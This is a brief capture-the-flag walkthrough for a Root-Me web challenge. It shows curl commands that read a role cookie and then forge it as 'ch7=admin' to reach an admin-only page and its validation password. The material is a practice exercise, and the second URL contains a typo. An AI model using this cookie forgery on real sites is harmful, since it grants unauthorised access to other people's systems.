Well, we arrive on the webpage, and we see that we can enter a mail address, and that it is certainly stored somewhere. I guess the goal is to access this little button "Saved email address". But currently, clicking on it returns:

```
You need to be admin
```

The title of the challenge is a great hint, let's get the cookies:

```
curl -v http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur
```

We see in the response:

```
Set-Cookie: ch7=visiteur
```
(it was also written in the source code of the page). Well, let's just change this cookie and put ch7=admin instead.

```
 curl -H "cookie: ch7=admin" -v http://challenge01.rootorg/web-serveur/ch7/?c=visiteur
```

The response is now:

```
<div>Validation password : FLAG</div></fieldset>
```
